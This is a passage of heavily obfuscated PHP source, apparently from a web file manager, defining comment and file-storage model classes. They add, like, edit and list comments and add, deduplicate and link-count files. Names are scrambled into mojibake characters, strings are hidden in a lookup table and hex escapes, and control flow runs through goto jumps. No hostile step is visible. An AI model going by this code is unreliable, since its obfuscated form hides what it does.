$GLOBALS[$d·êÇ†ö£í[2]][$d·êÇ†ö£í[3]]; } goto bœ§ÀÖå‡¯; b…ˆ©Á¶òÈ: } goto b‚Íßë∏€Â; E‰ÔÃô™±À: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\145\156\164"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\x6d\145" => "\x63\157\x6d\155\145\x6e\164\137\x6d\145\164\141", "\155\145\164\x61\106\x69\x65\x6c\x64" => "\143\157\x6d\x6d\145\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Fã÷≤˘á Á) { $dÚùßÑÏˆ¡ =& $_SERVER[Æ¡î¢≠¯™]; if ($Fã÷≤˘á Á[$dÚùßÑÏˆ¡[2088]]) { $fÍ…ŸåòÇç = $this->where(array($dÚùßÑÏˆ¡[2089] => $Fã÷≤˘á Á[$dÚùßÑÏˆ¡[2088]]))->find(); if (!$fÍ…ŸåòÇç || $fÍ…ŸåòÇç[$dÚùßÑÏˆ¡[376]] != $Fã÷≤˘á Á[$dÚùßÑÏˆ¡[376]] || $fÍ…ŸåòÇç[$dÚùßÑÏˆ¡[460]] != $Fã÷≤˘á Á[$dÚùßÑÏˆ¡[460]]) { return !1; } $this->where(array($dÚùßÑÏˆ¡[2089] => $Fã÷≤˘á Á[$dÚùßÑÏˆ¡[2088]]))->setAdd($dÚùßÑÏˆ¡[2090], 1); } return $this->add($Fã÷≤˘á Á); } public function remove($b≠Óãë¯Âﬁ) { $AÁµ€íÑ˜µ =& $_SERVER[Æ¡î¢≠¯™]; $CãøãÍü›Ç = array($AÁµ€íÑ˜µ[2089] => $b≠Óãë¯Âﬁ); $fãù¬¬ºê´ = $this->where($CãøãÍü›Ç)->find(); if ($fãù¬¬ºê´[$AÁµ€íÑ˜µ[2088]]) { $this->where(array($AÁµ€íÑ˜µ[2089] => $fãù¬¬ºê´[$AÁµ€íÑ˜µ[2088]]))->setAdd($AÁµ€íÑ˜µ[2090], -1); } return $this->where($CãøãÍü›Ç)->delete(); } public function edit($b°â◊ïç¢Ø, $Eﬁ∑´∂‚ä≈) { $aõÓ‡π∆Ö„ =& $_SERVER[Æ¡î¢≠¯™]; $b¬«Œ¢”÷© = array($aõÓ‡π∆Ö„[2089] => $b°â◊ïç¢Ø); return $this->where($b¬«Œ¢”÷©)->save(array($aõÓ‡π∆Ö„[2091] => $Eﬁ∑´∂‚ä≈)); } public function prasise($Bê∂òö∫ïß) { $d™ùö≈íí∏ =& $_SERVER[Æ¡î¢≠¯™]; $fÊﬂÌÓÎﬁ≤ = Model($d™ùö≈íí∏[2092]); $C÷ÆÚ¬≠§§ = array($d™ùö≈íí∏[2089] => $Bê∂òö∫ïß, $d™ùö≈íí∏[1388] => USER_ID); $Bì∏¨°ËåΩ = $fÊﬂÌÓÎﬁ≤->where($C÷ÆÚ¬≠§§)->find(); if (!$Bì∏¨°ËåΩ) { $fÊﬂÌÓÎﬁ≤->add($C÷ÆÚ¬≠§§); $C‹”π™˜∏• = $this->where(array($d™ùö≈íí∏[2089] => $Bê∂òö∫ïß))->setAdd($d™ùö≈íí∏[2093], 1); } else { $fÊﬂÌÓÎﬁ≤->where($C÷ÆÚ¬≠§§)->delete(); $C‹”π™˜∏• = $this->where(array($d™ùö≈íí∏[2089] => $Bê∂òö∫ïß))->setAdd($d™ùö≈íí∏[2093], -1); } return $C‹”π™˜∏•; } public function targetInfo($E¨Ë∫àπÀ‰, $b°ÂÜæ¡Ò¯) { goto C¥⁄Ü¶ïä∑; D‡ﬁ¶Ë˜Îò: return $a®†¿úÕ™Ê; goto D»£–Úóë˘; C¥⁄Ü¶ïä∑: $E¯Ç¢∞‹ô∞ =& $_SERVER[Æ¡î¢≠¯™]; $a†´∫˜Ê™Ó = array($E¯Ç¢∞‹ô∞[525] => $E¨Ë∫àπÀ‰, $E¯Ç¢∞‹ô∞[526] => $b°ÂÜæ¡Ò¯); $C—‡ÇÜÿ‡ñ = $this->where($a†´∫˜Ê™Ó)->count(); goto A ƒÜé‚‰ã; A ƒÜé‚‰ã: $c¡ñ◊’ÿèÃ = "\x52\111\107\110\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\143\157\x6d\155\145\x6e\x74\137\160\162\x61\151\x73\145\x20\163\164\x61\162\40\157\x6e\x20\143\157\155\155\x65\x6e\164\x2e\x63\157\x6d\x6d\145\156\164\111\x44\40\x3d\40\x73\164\141\x72\56\x63\157\155\x6d\145\156\x74\x49\x44"; $AÕ∆ª®öÆ¡ = $this->alias($E¯Ç¢∞‹ô∞[347])->where($a†´∫˜Ê™Ó)->join($c¡ñ◊’ÿèÃ, $E¯Ç¢∞‹ô∞[2094])->count(); $a®†¿úÕ™Ê = array($E¯Ç¢∞‹ô∞[2095] => $C—‡ÇÜÿ‡ñ, $E¯Ç¢∞‹ô∞[2096] => $AÕ∆ª®öÆ¡); goto D‡ﬁ¶Ë˜Îò; D»£–Úóë˘: } public function listData($B ‹ØœÕÎ›) { $Cà⁄¶…ì∫∫ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2097]])) { if ($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2097]]) { $B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2098]] = array($Cà⁄¶…ì∫∫[916], intval($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2097]])); } unset($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2097]]); } if (isset($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2099]])) { if ($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2099]]) { $B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2098]] = array($Cà⁄¶…ì∫∫[913], intval($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2099]])); } unset($B ‹ØœÕÎ›[$Cà⁄¶…ì∫∫[2099]]); } return $this->_listData($B ‹ØœÕÎ›); } private function _listData($a÷ƒø≠©ç≈) { $Bà·ÚìÁöë =& $_SERVER[Æ¡î¢≠¯™]; $A˜î»Íã¯À = $this->where($a÷ƒø≠©ç≈)->_makeOrder()->selectPage(100); $this->_listAppendParent($A˜î»Íã¯À[$Bà·ÚìÁöë[360]]); $this->_listAppendUser($A˜î»Íã¯À[$Bà·ÚìÁöë[360]]); $this->_listAppendMeta($A˜î»Íã¯À[$Bà·ÚìÁöë[360]]); return $A˜î»Íã¯À; } private function _makeOrder() { $B∫ƒéÒÊëç =& $_SERVER[Æ¡î¢≠¯™]; $f¬îáÜƒøŒ = array($B∫ƒéÒÊëç[2093], $B∫ƒéÒÊëç[2090], $B∫ƒéÒÊëç[194]); $BÜÏ∆ªÏÊ· = Input::get($B∫ƒéÒÊëç[411], $B∫ƒéÒÊëç[7], $B∫ƒéÒÊëç[394], $f¬îáÜƒøŒ); $A–ÌÖå™Û∑ = Input::get($B∫ƒéÒÊëç[412], $B∫ƒéÒÊëç[7], $B∫ƒéÒÊëç[1390], array($B∫ƒéÒÊëç[2100], $B∫ƒéÒÊëç[409])); $A¿ßË¥øÀã = $BÜÏ∆ªÏÊ· . $B∫ƒéÒÊëç[50] . $A–ÌÖå™Û∑; return $this->order($A¿ßË¥øÀã); } private function _listAppendParent(&$CŸÇñ∫àîÏ) { goto EÜ™úøãŒå; EÜ™úøãŒå: $BÓëÎ…‘’¿ =& $_SERVER[Æ¡î¢≠¯™]; $eùƒí´—ú… = array_unique(array_to_keyvalue($CŸÇñ∫àîÏ, $BÓëÎ…‘’¿[33], $BÓëÎ…‘’¿[2088])); $eùƒí´—ú… = array_remove_value($eùƒí´—ú…, $BÓëÎ…‘’¿[472]); goto eÛÀÃ¶ß€ª; fÉªéæ¡ç∏: foreach ($CŸÇñ∫àîÏ as &$b∞ÏÑÙÎ¢ƒ) { if (isset($DáÓ∫µ≥èŒ[$b∞ÏÑÙÎ¢ƒ[$BÓëÎ…‘’¿[2088]]])) { $b∞ÏÑÙÎ¢ƒ[$BÓëÎ…‘’¿[2101]] = $DáÓ∫µ≥èŒ[$b∞ÏÑÙÎ¢ƒ[$BÓëÎ…‘’¿[2088]]]; } } goto BÙçîÂ˜∆≥; eÛÀÃ¶ß€ª: if (!$eùƒí´—ú…) { return; } $DáÓ∫µ≥èŒ = $this->where(array($BÓëÎ…‘’¿[2089] => array($BÓëÎ…‘’¿[7], $eùƒí´—ú…)))->select(); $DáÓ∫µ≥èŒ = array_to_keyvalue($DáÓ∫µ≥èŒ, $BÓëÎ…‘’¿[2098]); goto fÉªéæ¡ç∏; BÙçîÂ˜∆≥: } private function _listAppendUser(&$dí´ã√”óë) { goto A»ªÖãâãî; A»ªÖãâãî: $eâπ¨∆—°Œ =& $_SERVER[Æ¡î¢≠¯™]; $A∆ÿ≠≈œ¡â = array_unique(array_to_keyvalue($dí´ã√”óë, $eâπ¨∆—°Œ[33], $eâπ¨∆—°Œ[1397])); $A∆ÿ≠≈œ¡â = array_remove_value($A∆ÿ≠≈œ¡â, $eâπ¨∆—°Œ[472]); goto C…ì≠ÕÆ›ﬂ; C…ì≠ÕÆ›ﬂ: if (count($A∆ÿ≠≈œ¡â) == 0) { return; } foreach ($dí´ã√”óë as $b¿õ∂ë›ãÏ) { if (isset($b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[2101]])) { $A∆ÿ≠≈œ¡â[] = $b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[2101]][$eâπ¨∆—°Œ[1397]]; } } $cÕ„ÙÉ˘¶« = Model($eâπ¨∆—°Œ[481])->userListInfo($A∆ÿ≠≈œ¡â); goto fßçÜ¥ï⁄„; fßçÜ¥ï⁄„: foreach ($dí´ã√”óë as &$b¿õ∂ë›ãÏ) { $b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[539]] = $cÕ„ÙÉ˘¶«[$b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[1397]]]; if (isset($b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[2101]])) { $b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[2101]][$eâπ¨∆—°Œ[539]] = $cÕ„ÙÉ˘¶«[$b¿õ∂ë›ãÏ[$eâπ¨∆—°Œ[2101]][$eâπ¨∆—°Œ[1397]]]; } } goto d—∂∫ä¨ïõ; d—∂∫ä¨ïõ: } private function _listAppendMeta(&$C¶´¨∏™ÿ) { goto Dæ¶◊”÷»¬; EÂ‡ÃΩÑ÷ê: if (!$e‹éƒπ°âœ) { return; } foreach ($C¶´¨∏™ÿ as $eõ–Àéí≥´) { if (isset($eõ–Àéí≥´[$EÉ‰Á¿°•¶[2101]])) { $e‹éƒπ°âœ[] = $eõ–Àéí≥´[$EÉ‰Á¿°•¶[2101]][$EÉ‰Á¿°•¶[2098]]; } } $b°äìÁ”ØÀ = $this->metaList($e‹éƒπ°âœ); goto e◊Ÿ¡“◊∂ó; Dæ¶◊”÷»¬: $EÉ‰Á¿°•¶ =& $_SERVER[Æ¡î¢≠¯™]; $e‹éƒπ°âœ = array_unique(array_to_keyvalue($C¶´¨∏™ÿ, $EÉ‰Á¿°•¶[33], $EÉ‰Á¿°•¶[2098])); $e‹éƒπ°âœ = array_remove_value($e‹éƒπ°âœ, $EÉ‰Á¿°•¶[472]); goto EÂ‡ÃΩÑ÷ê; e◊Ÿ¡“◊∂ó: if (!$b°äìÁ”ØÀ) { return !1; } foreach ($C¶´¨∏™ÿ as &$eõ–Àéí≥´) { $eõ–Àéí≥´[$EÉ‰Á¿°•¶[421]] = $b°äìÁ”ØÀ[$eõ–Àéí≥´[$EÉ‰Á¿°•¶[2098]]]; if (isset($eõ–Àéí≥´[$EÉ‰Á¿°•¶[2101]])) { $eõ–Àéí≥´[$EÉ‰Á¿°•¶[2101]][$EÉ‰Á¿°•¶[421]] = $b°äìÁ”ØÀ[$eõ–Àéí≥´[$EÉ‰Á¿°•¶[2101]][$EÉ‰Á¿°•¶[2098]]]; } } goto d… îáääƒ; d… îáääƒ: } private function metaList($FÛü©ª†ê∏) { goto Câ øﬁÜóõ; Câ øﬁÜóõ: $aŸŸ∏Ó≤åÃ =& $_SERVER[Æ¡î¢≠¯™]; if (!$FÛü©ª†ê∏) { return array(); } $Bø∂€‡å¯Ó = array($aŸŸ∏Ó≤åÃ[2098] => array($aŸŸ∏Ó≤åÃ[7], $FÛü©ª†ê∏)); goto FÛÃÌπÌ¯; FÇæÈ∞Ô´÷: return $fé≈∆Ã’éÃ ? $fé≈∆Ã’éÃ : array(); goto f¢ÿç€°óÛ; FÛÃÌπÌ¯: $fé≈∆Ã’éÃ = Model($aŸŸ∏Ó≤åÃ[2102])->where($Bø∂€‡å¯Ó)->select(); $fé≈∆Ã’éÃ = array_to_keyvalue_group($fé≈∆Ã’éÃ, $aŸŸ∏Ó≤åÃ[2098]); foreach ($fé≈∆Ã’éÃ as $B◊÷ëﬁá·ã => $d”ã¯Œ∆÷Í) { $DÛ±∞ÖÓáﬁ = array(); foreach ($d”ã¯Œ∆÷Í as $E€Î⁄»º’—) { $DÛ±∞ÖÓáﬁ[$E€Î⁄»º’—[$aŸŸ∏Ó≤åÃ[99]]] = $E€Î⁄»º’—[$aŸŸ∏Ó≤åÃ[365]]; } $fé≈∆Ã’éÃ[$B◊÷ëﬁá·ã] = $DÛ±∞ÖÓáﬁ; } goto FÇæÈ∞Ô´÷; f¢ÿç€°óÛ: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\x74\x61\142\154\145\116\141\155\x65" => "\151\x6f\x5f\146\x69\x6c\x65\x5f\x6d\145\x74\x61", "\155\145\x74\141\x46\151\x65\x6c\x64" => "\146\151\154\145\111\x44"); public function fileInfo($aø“‘‹§£‡) { $dπüê§¡ÿµ =& $_SERVER[Æ¡î¢≠¯™]; static $A÷Ã›∫ñ»Ç = array(); if (!isset($A÷Ã›∫ñ»Ç[$aø“‘‹§£‡])) { $D⁄‡”Ç≥çÓ = $dπüê§¡ÿµ[2103]; $C—…„π¿∏» = Model($dπüê§¡ÿµ[426])->field($D⁄‡”Ç≥çÓ)->where(array($dπüê§¡ÿµ[424] => $aø“‘‹§£‡))->find(); $A÷Ã›∫ñ»Ç[$aø“‘‹§£‡] = $C—…„π¿∏»; } return $A÷Ã›∫ñ»Ç[$aø“‘‹§£‡]; } public function addFileByContent($E”ÈƒÕê÷Í = '', $F ™÷æ»è∏ = '') { goto DÌõ«ñÒï„; DÌõ«ñÒï„: $fÊ†Ö«¶ú“ =& $_SERVER[Æ¡î¢≠¯™]; $aÔáÖÍƒåﬁ = TEMP_PATH . $fÊ†Ö«¶ú“[2104]; if (!is_dir($aÔáÖÍƒåﬁ)) { mk_dir($aÔáÖÍƒåﬁ); } goto eÖÁ∆•ìŒ…; eÖÁ∆•ìŒ…: $b“ÖÉÆÁÔû = $aÔáÖÍƒåﬁ . $fÊ†Ö«¶ú“[2105] . rand_string(16); file_put_contents($b“ÖÉÆÁÔû, $E”ÈƒÕê÷Í); $Dä≈Éãò‘„ = $this->addFile($b“ÖÉÆÁÔû, $F ™÷æ»è∏, !0); goto DÊâµ’ã´Ê; DÊâµ’ã´Ê: if (file_exists($b“ÖÉÆÁÔû)) { @unlink($b“ÖÉÆÁÔû); } return $Dä≈Éãò‘„; goto aˆ”¬äıÎø; aˆ”¬äıÎø: } public function createFileName($FåéúëƒÜî) { goto Bè˜âÇ—üÜ; Aå •Ô“π¡: if (!$B‹ÍáÙÉ¥ª && !Cache::get($C–Á·ÃËìë)) { $B‹ÍáÙÉ¥ª = !0; $F£äΩé∏±‹ = IO::mkdir($D›∞øâ⁄´); if (!IO::exist($F£äΩé∏±‹ . $EÖÂìƒ≠™[2107])) { IO::mkfile($F£äΩé∏±‹ . $EÖÂìƒ≠™[2107]); } Cache::set($C–Á·ÃËìë, 1, 3600 * 2); } return $A”ó•éúÑè; goto BËﬁéàÉ∆è; f•“≥ÃÊé£: $D›∞øâ⁄´ = $eºæîñ±ﬂ∞->pathFather($A”ó•éúÑè); static $B‹ÍáÙÉ¥ª = false; $C–Á·ÃËìë = $EÖÂìƒ≠™[2106] . md5($D›∞øâ⁄´); goto Aå •Ô“π¡; Bè˜âÇ—üÜ: $EÖÂìƒ≠™ =& $_SERVER[Æ¡î¢≠¯™]; $eºæîñ±ﬂ∞ = IO::init($EÖÂìƒ≠™[8]); $A”ó•éúÑè = $this->makeFilePath($FåéúëƒÜî, $eºæîñ±ﬂ∞); goto f•“≥ÃÊé£; BËﬁéàÉ∆è: } public function makeFilePath($A÷ﬂ¿å¯âÂ, $BÓıúóÎ¥Ñ) { goto fÈè©‹ßÇö; a—∂÷‰à¶ı: switch ($A‰›·œÉ¢≤) { case $f™Êè∫ù∑í[2111]: $fﬁÜû÷™ÑÀ = $fﬁÜû÷™ÑÀ . $f™Êè∫ù∑í[103] . $BÓıúóÎ¥Ñ->ext($A÷ﬂ¿å¯âÂ); if ($BÓıúóÎ¥Ñ->ext($A÷ﬂ¿å¯âÂ) == $f™Êè∫ù∑í[2051]) { $fﬁÜû÷™ÑÀ .= $f™Êè∫ù∑í[2112]; } break; case $f™Êè∫ù∑í[2113]: goto CÂ∏èÔïÁ…; aπÉ«ã∑ˆÊ: if ($BÓıúóÎ¥Ñ->ext($A÷ﬂ¿å¯âÂ) == $f™Êè∫ù∑í[2051]) { $A÷ﬂ¿å¯âÂ .= $f™Êè∫ù∑í[2112]; } $fû¥—–òÈ• = IO::fileNameAuto($B”èƒôØ‰‡, $A÷ﬂ¿å¯âÂ); $fﬁÜû÷™ÑÀ = $B”èƒôØ‰‡ . $fû¥—–òÈ•; goto Aãç¢ÃÔÒË; Aãç¢ÃÔÒË: break; goto D∫≥ÍÜÊ©˜; CÂ∏èÔïÁ…: $e€ÕÌÛÜåê = Model($f™Êè∫ù∑í[1074])->get($f™Êè∫ù∑í[1298]); $DÖÒ≥íÏ˜« = substr(md5($f™Êè∫ù∑í[1870] . $e€ÕÌÛÜåê . date($f™Êè∫ù∑í[679])), 0, 8); $B”èƒôØ‰‡ = KodIO::defaultIO() . date($f™Êè∫ù∑í[2114]) . $DÖÒ≥íÏ˜« . $f™Êè∫ù∑í[8]; goto aπÉ«ã∑ˆÊ; D∫≥ÍÜÊ©˜: case $f™Êè∫ù∑í[2110]: break; default: break; } return $fﬁÜû÷™ÑÀ; goto fΩ≥⁄ÖΩ’; fÈè©‹ßÇö: $f™Êè∫ù∑í =& $_SERVER[Æ¡î¢≠¯™]; $A‰›·œÉ¢≤ = Model($f™Êè∫ù∑í[1074])->get($f™Êè∫ù∑í[2108]); $B”èƒôØ‰‡ = KodIO::defaultIO() . date($f™Êè∫ù∑í[2109]); goto CÖäëØ∆™˘; CÖäëØ∆™˘: $fﬁÜû÷™ÑÀ = $B”èƒôØ‰‡ . rand_string(5) . short_id(100); $A÷ﬂ¿å¯âÂ = str_replace($f™Êè∫ù∑í[8], $f™Êè∫ù∑í[80], KodIO::clear($A÷ﬂ¿å¯âÂ)); if (!$A÷ﬂ¿å¯âÂ) { $A‰›·œÉ¢≤ = $f™Êè∫ù∑í[2110]; } goto a—∂÷‰à¶ı; fΩ≥⁄ÖΩ’: } public function addFileByRemote($fÛÇóÛ™∆È, $eÖÃìÖºÓ¢, $EÛÀ˘÷ˆ≤ú = array()) { goto BÛŸƒﬂ≠ÈË; fπïç¿∏ß: $c·«†πáº = IO::hashMd5($fÛÇóÛ™∆È, $fû€Ô¥£µ±); $bà∆í≈öàò = KodIO::defaultDriver(); $dç«—¢∞öΩ = array($Fì¬ÙÉ‘î¬[524] => IO::size($fÛÇóÛ™∆È), $Fì¬ÙÉ‘î¬[2115] => 1, $Fì¬ÙÉ‘î¬[391] => $eÖÃìÖºÓ¢, $Fì¬ÙÉ‘î¬[727] => $bà∆í≈öàò[$Fì¬ÙÉ‘î¬[372]], $Fì¬ÙÉ‘î¬[392] => $fÛÇóÛ™∆È, $Fì¬ÙÉ‘î¬[2116] => $EÛÀ˘÷ˆ≤ú[$Fì¬ÙÉ‘î¬[171]] ? $EÛÀ˘÷ˆ≤ú[$Fì¬ÙÉ‘î¬[171]] : IO::hashSimple($fÛÇóÛ™∆È), $Fì¬ÙÉ‘î¬[2117] => $c·«†πáº ? $c·«†πáº : $fû€Ô¥£µ±); goto c«Óè√àÇæ; BÛŸƒﬂ≠ÈË: $Fì¬ÙÉ‘î¬ =& $_SERVER[Æ¡î¢≠¯™]; if (!IO::exist($fÛÇóÛ™∆È)) { return !1; } $fû€Ô¥£µ± = $EÛÀ˘÷ˆ≤ú[$Fì¬ÙÉ‘î¬[170]] ? $EÛÀ˘÷ˆ≤ú[$Fì¬ÙÉ‘î¬[170]] : $Fì¬ÙÉ‘î¬[33]; goto fπïç¿∏ß; c«Óè√àÇæ: if ($dﬁ°Ç◊§™ò = $this->addFileCheckExist($dç«—¢∞öΩ[$Fì¬ÙÉ‘î¬[171]], $dç«—¢∞öΩ[$Fì¬ÙÉ‘î¬[170]], $dç«—¢∞öΩ[$Fì¬ÙÉ‘î¬[87]])) { return $dﬁ°Ç◊§™ò; } return $this->addFileData($dç«—¢∞öΩ); goto b≠’åπóÜµ; b≠’åπóÜµ: } private function addFileData($e—Ú œè±®) { $f©º¥¥Öà˘ =& $_SERVER[Æ¡î¢≠¯™]; if (!$e—Ú œè±®) { return !1; } $e—Ú œè±®[$f©º¥¥Öà˘[87]] = intval($e—Ú œè±®[$f©º¥¥Öà˘[87]]); if (!$e—Ú œè±®[$f©º¥¥Öà˘[87]] && strlen($e—Ú œè±®[$f©º¥¥Öà˘[171]]) > 32) { $e—Ú œè±®[$f©º¥¥Öà˘[87]] = intval(substr($e—Ú œè±®[$f©º¥¥Öà˘[171]], 32)); } $a◊¥Ü≈È∞ê = $this->add($e—Ú œè±®); return $this->find($a◊¥Ü≈È∞ê); } public function addFile($DÃÚæ¬Ô§Ö, $eÜ∫˜ûƒË∞, $dÎíÉ‘·¥é = false) { $CÈçÂ™È«´ = IO::hashSimple($DÃÚæ¬Ô§Ö); $f“è†÷Ÿû÷ = IO::hashMd5($DÃÚæ¬Ô§Ö); $d±√ÎÀ¯åÒ = IO::size($DÃÚæ¬Ô§Ö); if ($D¬«‹Éúúè = $this->addFileCheckExist($CÈçÂ™È«´, $f“è†÷Ÿû÷, $d±√ÎÀ¯åÒ)) { return $D¬«‹Éúúè; } $dºﬂôÊüÊé = $this->addFileMake($DÃÚæ¬Ô§Ö, $d±√ÎÀ¯åÒ, $CÈçÂ™È«´, $f“è†÷Ÿû÷, $eÜ∫˜ûƒË∞, $dÎíÉ‘·¥é); return $this->addFileData($dºﬂôÊüÊé); } public function addFileMake($f§èæï—©ä, $BÔçéˆñﬂÊ, $F—ÛÉÌ≤≥Ï, $f≥ Ñ…Á‹Û, $f´πÂÀﬁ¬ﬁ, $D·à°≠‰ÈÑ) { goto Fƒ´°∆–ı; b√∑Ê‘ø‚ë: $CÊË›®ﬂÖö = KodIO::defaultDriver(); $bå™åÍŸƒ€ = array($c∫€åÉ·Ç‹[524] => $BÔçéˆñﬂÊ, $c∫€åÉ·Ç‹[2115] => 1, $c∫€åÉ·Ç‹[391] => $f´πÂÀﬁ¬ﬁ, $c∫€åÉ·Ç‹[727] => $CÊË›®ﬂÖö[$c∫€åÉ·Ç‹[372]], $c∫€åÉ·Ç‹[392] => $Eò»ﬁ‡Í⁄§, $c∫€åÉ·Ç‹[2116] => $F—ÛÉÌ≤≥Ï, $c∫€åÉ·Ç‹[2117] => $f≥ Ñ…Á‹Û); return $bå™åÍŸƒ€; goto cÒÏä“ØùÒ; Fƒ´°∆–ı: $c∫€åÉ·Ç‹ =& $_SERVER[Æ¡î¢≠¯™]; $Eò»ﬁ‡Í⁄§ = $this->createFileName($f´πÂÀﬁ¬ﬁ); $EéÉΩË˘ñ˜ = get_path_father($Eò»ﬁ‡Í⁄§); goto Cîô«£â⁄á; Cîô«£â⁄á: $b•äéííêŒ = get_path_this($Eò»ﬁ‡Í⁄§); if ($D·à°≠‰ÈÑ) { $EÏÆ¶£ŒΩê = IO::move($f§èæï—©ä, $EéÉΩË˘ñ˜, !1, $b•äéííêŒ); } else { $EÏÆ¶£ŒΩê = IO::copy($f§èæï—©ä, $EéÉΩË˘ñ˜, !1, $b•äéííêŒ); } if (!$EÏÆ¶£ŒΩê) { return !1; } goto b√∑Ê‘ø‚ë; cÒÏä“ØùÒ: } public function addFileCheckExist($E›ÔÔí∏¯∞, $f∑’ëÕÿå°, $bâ¿‘ˆãõÜ) { $c¯‹ÿíÎ˜≤ =& $_SERVER[Æ¡î¢≠¯™]; $bñÂ∏¢àóÙ = $this->findByHash($E›ÔÔí∏¯∞, $f∑’ëÕÿå°); if (!$bñÂ∏¢àóÙ) { return !1; } $FùôÍﬂÈ∞  = array($c¯‹ÿíÎ˜≤[2115] => intval($bñÂ∏¢àóÙ[$c¯‹ÿíÎ˜≤[2118]]) + 1, $c¯‹ÿíÎ˜≤[524] => $bâ¿‘ˆãõÜ); $this->where(array($c¯‹ÿíÎ˜≤[424] => $bñÂ∏¢àóÙ[$c¯‹ÿíÎ˜≤[423]]))->save($FùôÍﬂÈ∞ ); return $bñÂ∏¢àóÙ; } public function remove($b©Ïå€Ê‰¬) { $this->linkCountChange($b©Ïå€Ê‰¬, !1); $this->clearEmpty(); return !0; } public function linkAdd($c„Ëµì‡π) { $this->linkCountChange($c„Ëµì‡π, !0); } public function linkCountChange($f‚™–Õˆ∞, $F±ªÎ“Ô ‰) { goto Bƒ‰õÀ≈âù; FÁÑÚ“ûçã: foreach ($c‹Ω›±∂ÓÖ as $bÿÿç€îƒ± => $DÉÿ®‡•°±) { $fÏﬂçÆ∫‰◊ = $DÉÿ®‡•°± . $bÕëåê—¨ä[33]; if (!$BÑòÙÇÃÒÑ[$fÏﬂçÆ∫‰◊]) { $BÑòÙÇÃÒÑ[$fÏﬂçÆ∫‰◊] = array(); } $BÑòÙÇÃÒÑ[$fÏﬂçÆ∫‰◊][] = $bÿÿç€îƒ±; } foreach ($BÑòÙÇÃÒÑ as $DÉÿ®‡•°± => $cúÇ„°⁄Œé) { if (!$cúÇ„°⁄Œé) { continue; } $DÉÿ®‡•°± = $F±ªÎ“Ô ‰ ? $DÉÿ®‡•°± : -intval($DÉÿ®‡•°±); $Cä‘´à˜üá = array($bÕëåê—¨ä[423] => array($bÕëåê—¨ä[7], $cúÇ„°⁄Œé)); if ($DÉÿ®‡•°± < 0) { $Cä‘´à˜üá[$bÕëåê—¨ä[2118]] = array($bÕëåê—¨ä[917], abs($DÉÿ®‡•°±)); } $this->where($Cä‘´à˜üá)->setAdd($bÕëåê—¨ä[2118], $DÉÿ®‡•°±); } goto cã’∑ïéîπ; Bƒ‰õÀ≈âù: $bÕëåê—¨ä =& $_SERVER[Æ¡î¢≠¯™]; if (!$f‚™–Õˆ∞) { return; } if (!is_array($f‚™–Õˆ∞)) { $f‚™–Õˆ∞ = array($f‚™–Õˆ∞); } goto CÇîÌæ√‘è; CÇîÌæ√‘è: $c‹Ω›±∂ÓÖ = array(); foreach ($f‚™–Õˆ∞ as $bÿÿç€îƒ±) { $fÏﬂçÆ∫‰◊ = $bÿÿç€îƒ± . $bÕëåê—¨ä[33]; if (!$c‹Ω›±∂ÓÖ[$fÏﬂçÆ∫‰◊]) { $c‹Ω›±∂ÓÖ[$fÏﬂçÆ∫‰◊] = 0; } $c‹Ω›±∂ÓÖ[$fÏﬂçÆ∫‰◊]++; } $BÑòÙÇÃÒÑ = array(); goto FÁÑÚ“ûçã; cã’∑ïéîπ: } public function findByHash($eªÓ‹º¥™, $BÉ”ª≤∂‡Ø = false) { $DÀÇó‚¢ÔÉ =& $_SERVER[Æ¡î¢≠¯™]; if (!$eªÓ‹º¥™ && !$BÉ”ª≤∂‡Ø) { return !1; } $Dπ´Òóä∑´ = array($DÀÇó‚¢ÔÉ[2116] => $eªÓ‹º¥™); if ($BÉ”ª≤∂‡Ø) { $Dπ´Òóä∑´ = array($DÀÇó‚¢ÔÉ[2117] => $BÉ”ª≤∂‡Ø); } return $this->order($DÀÇó‚¢ÔÉ[2119])->where($Dπ´Òóä∑´)->find(); } public function clearEmpty($A≠µﬁÊÁ⁄á = 0) { goto BÙ∞Æîö€•; Fëì“ åø©: $B≈Ÿí÷ΩÒí = $this->where($cΩﬂ∞‡£öã)->select(); if (!$B≈Ÿí÷ΩÒí) { return; } $DÃöÒÖÑÜ¯ = new Task($Bô±≥çÉ‹ﬂ[2121], $Bô±≥çÉ‹ﬂ[33], count($B≈Ÿí÷ΩÒí)); goto Eêä⁄ÛªÚé; Eêä⁄ÛªÚé: foreach ($B≈Ÿí÷ΩÒí as $Aÿå¿—ÈΩå) { $DÃöÒÖÑÜ¯->update(1); $this->resetFile($Aÿå¿—ÈΩå); } $DÃöÒÖÑÜ¯->end(); goto dôµ‘ãóºã; BÙ∞Æîö€•: $Bô±≥çÉ‹ﬂ =& $_SERVER[Æ¡î¢≠¯™]; $FÙ§–¯´âÜ = time() - 3600 * 24 * $A≠µﬁÊÁ⁄á; $cΩﬂ∞‡£öã = $Bô±≥çÉ‹ﬂ[2120] . $FÙ§–¯´âÜ; goto Fëì“ åø©; dôµ‘ãóºã: } private function resetFile($Aìå«ñ¶ç) { goto EÚØÉëì„ß; EÚØÉëì„ß: $a◊ìﬂû°Ñ⁄ =& $_SERVER[Æ¡î¢≠¯™]; $AÜ¿„ÆπÜ = 